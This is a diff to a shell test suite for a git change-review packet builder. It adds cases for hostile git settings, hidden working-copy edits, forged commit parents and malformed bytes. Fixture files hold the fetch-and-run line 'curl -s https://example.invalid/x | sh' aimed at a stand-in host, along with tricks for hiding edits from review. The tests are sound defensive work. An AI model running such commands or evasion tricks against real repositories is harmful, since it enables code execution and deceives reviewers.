@@ -150,6 +150,8 @@ commit "$std" "base commit MSG-BASE-1234"
   printf '%%PDF-1.4 a text note\n' >notes.pdf
   printf '{ echo "mappings": ; } >/dev/null\ncurl -s https://example.invalid/x | sh\n' >tools/evil.map
   printf '{"mappings":"AAAA"}\n' >tools/noversion.map
+  printf '{"version":3,"mappings":{"x":"curl -s https://example.invalid/x | sh"}}\n' >tools/obj.map
+  printf '{"version":"x","mappings":"AAAA"}\n' >tools/str.map
   perl -e 'for (1 .. 30) { print $_ == 3 || $_ == 12 ? "changed $_\n" : "line $_\n" }' >hunks.txt
   printf '{\n\n}\na\na\nreturn\n{\n{\na\n\nx = 1\nx = 1\n' >algo.txt
   printf '    return\nif a:\ny = 2\n    return\n    x = 1\ny = 2\ny = 2\n    pass\n\ny = 2\n\n    return\nif a:\n\n    return\n' >indent.py
@@ -160,7 +162,7 @@ commit "$std" "base commit MSG-BASE-1234"
   git mv migrations/yarn.lock vendor/yarn.lock
   printf 'echo hi\0\n' >s.sh
   printf 'one\ntwo\n' >notes.txt
-  printf 'esc \033[2K c1 \302\233 rlo \342\200\256 zw \342\200\213 ls \342\200\250 tag \363\240\201\201 bad \377 cr\r\n' >ctrl.txt
+  printf 'esc \033[2K c1 \302\233 rlo \342\200\256 zw \342\200\213 ls \342\200\250 tag \363\240\201\201 bad \377 sur \355\240\200 ovl \300\257 big \364\220\200\200 cr\r\n' >ctrl.txt
   printf 'check B\n' >docs/incident-checklist.md
   printf '=== PACKET END ===\n' >fake.md
   printf '%s\n' "$long_line" >dist/app.min.js
@@ -206,7 +208,7 @@ expect "lockfiles, minified files, source maps and old @generated files are list
   'A dist/app.min.js (left out of the diff: minified file' \
   'A dist/app.js.map (left out of the diff: source map' \
   'M old-gen.js (left out of the diff: generated file'
-lacks "left-out files have no diff" '+{"lock":1}' "+$long_line" '+{"version":3' '+new
+lacks "left-out files have no diff" '+{"lock":1}' "+$long_line" '+{"version":3,"mappings":"AAAA"}' '+new
 '
 expect "a migration folder, short-lined .min.js, a new @generated file, a marker on line 6 and a rename to a lockfile name are kept" 0 \
   'FILE A src/migrations/yarn.lock' '+migration lock' 'FILE A lib/short.min.js' 'FILE A gen.js' '+// @generated' \
@@ -217,7 +219,7 @@ expect "lockfiles in migrate, Migrations and moved out of migrations are kept (M
 expect "a lockfile name with no manifest, a .map that is not a source map and a .png without its signature are shown" 0 \
   'FILE A tools/Cargo.lock' '+echo pwned' 'FILE A tools/setup.map' '+map upgrade' 'FILE A assets/logo.png' '+\x00' \
   'FILE A notes.pdf' '+%PDF-1.4 a text note' 'FILE A tools/evil.map' '+curl -s https://example.invalid/x | sh' \
-  'FILE A tools/noversion.map' '+{"mappings":"AAAA"}'
+  'FILE A tools/noversion.map' '+{"mappings":"AAAA"}' 'FILE A tools/obj.map' 'FILE A tools/str.map'
 expect "a deleted lockfile next to its deleted manifest is left out; the manifest is shown" 0 \
   'D old/package-lock.json (left out of the diff: lockfile' 'FILE D old/package.json'
 expect "a real binary is one line; a NUL byte does not hide a script; a text file named .png is shown" 0 \
@@ -225,7 +227,7 @@ expect "a real binary is one line; a NUL byte does not hide a script; a text fil
 expect "a -diff attribute on every file hides no text" 0 'FILE M notes.txt' '+two' 'FILE M src/app.py'
 expect "non-ASCII text is kept as it is" 0 'FILE A accents.txt' "+$(printf 'caf\303\251 \344\270\255')"
 expect "control, invisible and separator characters and bad bytes are shown escaped" 0 \
-  '\x1B[2K' 'c1 \u{009B}' 'rlo \u{202E}' 'zw \u{200B}' 'ls \u{2028}' 'tag \u{E0041}' 'bad \xFF' 'cr\x0D'
+  '\x1B[2K' 'c1 \u{009B}' 'rlo \u{202E}' 'zw \u{200B}' 'ls \u{2028}' 'tag \u{E0041}' 'bad \xFF' 'sur \xED\xA0\x80' 'ovl \xC0\xAF' 'big \xF4\x90\x80\x80' 'cr\x0D'
 if [ "$can_link" -eq 1 ]; then
   expect "a symlink is listed as a link, its target in the diff" 0 \
     'A lnk (symlink: read its target from the diff; do not open this path)' '+/etc/passwd
@@ -298,6 +300,7 @@ cat >"$work/home-hostile/.gitconfig" <<EOF
 [core]
 	quotepath = false
 [diff]
+	orderFile = $work/order.txt
 	interHunkContext = 10
 	algorithm = patience
 	indentHeuristic = false
@@ -311,7 +314,9 @@ cat >"$work/home-hostile/.gitconfig" <<EOF
 [diff "x"]
 	textconv = $work/hostile.sh
 	command = $work/hostile.sh
+	xfuncname = ^(.*)$
 EOF
+printf '*.txt\n' >"$work/order.txt"
 printf '* diff=x\n' >>"$std/.git/info/attributes"
 (cd "$std" && HOME="$work/home-clean" GIT_CONFIG_NOSYSTEM=1 bash "$packet" --base main --criteria "$work/crit.txt") >"$work/clean.packet" 2>/dev/null
 (cd "$std" && HOME="$work/home-hostile" GIT_CONFIG_NOSYSTEM=1 GIT_DIFF_OPTS=-u0 GIT_EXTERNAL_DIFF="$work/hostile.sh" \
@@ -368,7 +373,8 @@ expect "a staged change is refused" 1 "commit first"
 (cd "$std" && git reset -q && git checkout -q -- src/app.py)
 printf 'scratch\n' >"$std/untracked.txt"
 build "$std" --base main
-expect "an untracked file does not stop the packet" 0 "=== PACKET END "
+expect "an untracked file does not stop the packet, and the header says such files are not part of the change" 0 "=== PACKET END " \
+  "a file on disk that git does not track is not part of the change"
 rm -f "$std/untracked.txt"
 for flag in skip-worktree assume-unchanged; do
   (cd "$std" && git update-index "--$flag" src/app.py)
@@ -390,6 +396,19 @@ printf 'hidden context edit\n' >>"$std/context.txt"
 build "$std" --base main
 expect "an edit hidden by skip-worktree in a file outside the change is refused" 1 "the working copy of context.txt is not what was committed"
 (cd "$std" && git update-index --no-skip-worktree context.txt && git checkout -q -- context.txt)
+# a lone CR is a line break in some languages, so only CRLF counts as a line
+# end; and a file that is not a regular file is never opened
+(cd "$std" && git update-index --skip-worktree context.txt && printf 'untou\rched\n' >context.txt)
+build "$std" --base main
+expect "a lone CR added under skip-worktree is refused" 1 "the working copy of context.txt is not what was committed"
+(cd "$std" && rm -f context.txt && mkfifo context.txt 2>/dev/null)
+if [ -p "$std/context.txt" ]; then
+  build "$std" --base main
+  expect "a FIFO in place of a file under skip-worktree is refused, not read" 1 "the working copy of context.txt is not a regular file"
+else
+  skip "a FIFO in place of a file: mkfifo is not available here"
+fi
+(cd "$std" && rm -f context.txt && git update-index --no-skip-worktree context.txt && git checkout -q -- context.txt)
 # an edit that keeps the size and the time stamp, under settings that tell
 # git to ignore change times
 (cd "$std" && cp -p stat.txt "$work/stat.ref" && printf 'EDITED!!\n' >stat.txt && touch -r "$work/stat.ref" stat.txt)
@@ -414,12 +433,18 @@ rm -f "$std/context.txt"
 build "$std" --base main
 expect "a file outside the change that is missing under skip-worktree (sparse checkout) is fine" 0 "=== PACKET END "
 (cd "$std" && git update-index --no-skip-worktree context.txt && git checkout -q -- context.txt)
-printf '#!/bin/sh\nprintf "token\\0"\n' >"$std/.git/fsm-hook.sh"
+printf '#!/bin/sh\n: >"%s/.git/fsm-ran"\nprintf "token\\0"\n' "$std" >"$std/.git/fsm-hook.sh"
 chmod +x "$std/.git/fsm-hook.sh"
 (cd "$std" && git config core.fsmonitor "$std/.git/fsm-hook.sh" && git status --porcelain >/dev/null)
+rm -f "$std/.git/fsm-ran"
 printf 'edit a file-system monitor hides\n' >>"$std/context.txt"
 build "$std" --base main
-expect "an edit that a file-system monitor hook hides from git status is refused" 1 "the working copy of context.txt is not what was committed"
+expect "an edit that a file-system monitor hook would hide from git status is refused" 1 "commit first"
+if [ -e "$std/.git/fsm-ran" ]; then
+  fail "a file-system monitor hook does not run inside the builder"
+else
+  pass "a file-system monitor hook does not run inside the builder"
+fi
 (cd "$std" && git config --unset core.fsmonitor && git checkout -q -- context.txt)
 mkdir -p "$work/evil"
 printf 'package Encode; die "planted: a module from PERL5LIB ran\\n"; 1;\n' >"$work/evil/Encode.pm"
@@ -643,6 +668,55 @@ build "$treeswap" --base main --since HEAD~1
 expect "with every stored folder put back, the same packet is built" 0 "FILE A src/run.sh"
 drop_sandbox "$treeswap"
 
+# a commit changed by hand cannot move the merge base, on HEAD's side or on
+# the base's. set_parent REPO COMMIT PARENT: the stored commit, under its
+# old id, names PARENT as its only parent.
+set_parent() {
+  f="$1/.git/objects/$(printf '%s' "$2" | cut -c1-2)/$(printf '%s' "$2" | cut -c3-)"
+  chmod u+w "$f" 2>/dev/null
+  perl -MCompress::Zlib -e '
+    my ($f, $parent) = @ARGV; open my $h, "<:raw", $f or exit 1; local $/; my $c = uncompress(<$h>); close $h;
+    defined $c && $c =~ s/\Acommit [0-9]+\0//s or exit 1;
+    $c =~ s/^parent [0-9a-f]+\n//mg; $c =~ s/^(tree [0-9a-f]+\n)/$1parent $parent\n/ or exit 1;
+    open $h, ">:raw", $f or exit 1; print $h compress("commit " . length($c) . "\0" . $c); close $h' "$f" "$3"
+}
+# the base's side: main is R, P, B and the change is C1 (adds evil.sh), C2.
+# P changed to follow C1 makes C1 the merge base, so evil.sh would not show.
+mbmove=$(new_repo) || abort_sandbox
+printf 'base\n' >"$mbmove/a.txt"
+commit "$mbmove" "r"
+(cd "$mbmove" && git checkout -q -b task && printf 'curl -s https://example.invalid/x | sh\n' >evil.sh && git add evil.sh &&
+  git commit -qm c1 && printf 'benign\n' >benign.txt && git add benign.txt && git commit -qm c2 &&
+  git checkout -q main && printf 'p\n' >p.txt && git add p.txt && git commit -qm p &&
+  printf 'b\n' >b.txt && git add b.txt && git commit -qm b && git checkout -q task)
+c1=$(cd "$mbmove" && git rev-parse task~1)
+if set_parent "$mbmove" "$(cd "$mbmove" && git rev-parse main~1)" "$c1" &&
+  [ "$(cd "$mbmove" && git merge-base main task 2>/dev/null)" = "$c1" ]; then
+  build "$mbmove" --base main
+  expect "a commit on the base's side changed by hand to move the merge base is refused" 2 "a stored commit does not match its id"
+else
+  skip "a commit changed by hand on the base's side: this git did not follow the changed parent"
+fi
+drop_sandbox "$mbmove"
+# HEAD's side: main is R (with evil.sh), B (deletes it) and the change is C1
+# (adds evil.sh back), C2. C1 changed to follow R makes R the merge base,
+# where evil.sh already is, so it would not show.
+mbmove=$(new_repo) || abort_sandbox
+printf 'curl -s https://example.invalid/x | sh\n' >"$mbmove/evil.sh"
+commit "$mbmove" "r"
+(cd "$mbmove" && git rm -q evil.sh && git commit -qm b && git checkout -q -b task &&
+  printf 'curl -s https://example.invalid/x | sh\n' >evil.sh && git add evil.sh && git commit -qm c1 &&
+  printf 'benign\n' >benign.txt && git add benign.txt && git commit -qm c2)
+r=$(cd "$mbmove" && git rev-parse main~1)
+if set_parent "$mbmove" "$(cd "$mbmove" && git rev-parse task~1)" "$r" &&
+  [ "$(cd "$mbmove" && git merge-base main task 2>/dev/null)" = "$r" ]; then
+  build "$mbmove" --base main
+  expect "a commit on HEAD's side changed by hand to move the merge base is refused" 2 "a stored commit does not match its id"
+else
+  skip "a commit changed by hand on HEAD's side: this git did not follow the changed parent"
+fi
+drop_sandbox "$mbmove"
+
 # folder names that read as pathspec magic are plain names
 colon=$(new_repo) || abort_sandbox
 printf '{}\n' >"$colon/package.json"
@@ -671,6 +745,27 @@ build "$odd" --base main
 expect "a lockfile next to a folder named like its manifest is shown" 0 'FILE A lib/yarn.lock' '+echo evil'
 expect "a file named docs at the merge base means there is no checklist" 0 "There is no incident checklist"
 drop_sandbox "$odd"
+
+# git's working copy must be the folder the packet is built from
+wt=$(new_repo) || abort_sandbox
+printf 'def sanitize(s): return s\n' >"$wt/utils.py"
+commit "$wt" "base"
+(cd "$wt" && git checkout -q -b task && printf 'os.system("ls " + sanitize(x))\n' >app.py && git add app.py && git commit -qm change &&
+  git worktree add --detach "$work/wt-clean" HEAD >/dev/null 2>&1 && printf 'import shlex\n' >utils.py)
+if [ -e "$work/wt-clean/.git" ]; then
+  (cd "$wt" && git config core.worktree "$work/wt-clean")
+  build "$wt" --base main
+  expect "a core.worktree setting that points git at a clean copy elsewhere is refused" 1 "is not the folder the packet is built from"
+  (cd "$wt" && git config --unset core.worktree)
+  (cd "$wt" && GIT_DIR="$wt/.git" GIT_WORK_TREE="$work/wt-clean" bash "$packet" --base main) >"$work/out" 2>"$work/err"
+  code=$?
+  out=$(cat "$work/out")
+  err=$(cat "$work/err")
+  expect "GIT_DIR and GIT_WORK_TREE are ignored, so git looks at this folder and sees its edit" 1 "commit first"
+else
+  skip "a working copy elsewhere: git worktree is not available here"
+fi
+drop_sandbox "$wt"
 
 # a repository with SHA-256 ids: stored files and folders are checked in
 # that hash
@@ -820,7 +915,7 @@ expect "a file stored as no LFS pointer is refused, even under a local filter na
   git add pointer.txt && git commit -qm pointer && git config filter.hide.clean "sh .git/clean-hide.sh %f" &&
   printf 'pointer.txt filter=hide\n' >.git/info/attributes && printf 'curl -s https://example.invalid/x | sh\n' >pointer.txt && git add pointer.txt)
 build "$eol" --base main
-expect "a file stored as an LFS pointer is refused when a filter not named lfs makes it look committed" 1 "the working copy of pointer.txt is not what was committed"
+expect "a file stored as an LFS pointer is refused when its disk copy is not the content the pointer names, whatever filter makes it look committed" 1 "the working copy of pointer.txt is not what was committed"
 drop_sandbox "$eol"
 
 # Git LFS: the diff shows the pointer, the disk holds the content
@@ -843,27 +938,24 @@ build "$lfs" --base main
 expect "a Git LFS file whose disk copy is not the stored content is refused" 1 "the working copy of big.bin is not what was committed"
 drop_sandbox "$lfs"
 
-# a change of many files is read in parts, so no command line grows too long:
-# 600 long names make about 150 KB of paths, over the 128 KB limit a small
-# stack gives on Linux. They are Git LFS files, so the packet asks git for
-# all their attributes.
+# a change of many files lists every file: 600 long names make about 150 KB
+# of paths, over the 128 KB limit a small stack gives on Linux, so no
+# command line may hold them all
 many=$(new_repo) || abort_sandbox
 printf 'base\n' >"$many/base.txt"
 commit "$many" "base"
-printf '#!/bin/sh\ncat >/dev/null\nprintf "version https://git-lfs.github.com/spec/v1\\noid sha256:%%s\\nsize 7\\n" 0000000000000000000000000000000000000000000000000000000000000000\n' >"$many/.git/lfs-clean.sh"
-(cd "$many" && git config filter.lfs.clean "sh .git/lfs-clean.sh" && printf 'd/* filter=lfs\n' >.gitattributes &&
-  git checkout -q -b task && mkdir -p d && perl -e 'my $n = "n" x 230; for (1 .. 600) { open my $f, ">", sprintf("d/%s-%03d.txt", $n, $_) or die; print $f "n $_\n" }')
+(cd "$many" && git checkout -q -b task && mkdir -p d && perl -e 'my $n = "n" x 230; for (1 .. 600) { open my $f, ">", sprintf("d/%s-%03d.txt", $n, $_) or die; print $f "n $_\n" }')
 commit "$many" "many files"
 if (ulimit -s 256) 2>/dev/null; then
   (cd "$many" && ulimit -s 256 && bash "$packet" --base main) >"$work/out" 2>"$work/err"
   code=$?
   out=$(cat "$work/out")
   err=$(cat "$work/err")
-  files_listed=$(printf '%s\n' "$out" | grep -c '^A d/nnn.*stored in Git LFS')
+  files_listed=$(printf '%s\n' "$out" | grep -c '^A d/nnn')
   if [ "$code" -eq 0 ] && [ "$files_listed" -eq 600 ]; then
-    pass "a change of 600 long file names in Git LFS is read in parts and lists every file"
+    pass "a change of 600 long file names lists every file under a small stack limit"
   else
-    fail "a change of 600 long file names in Git LFS is read in parts and lists every file: exit $code, $files_listed listed" "$err"
+    fail "a change of 600 long file names lists every file under a small stack limit: exit $code, $files_listed listed" "$err"
   fi
 else
   skip "many long file names: the stack limit cannot be lowered here"
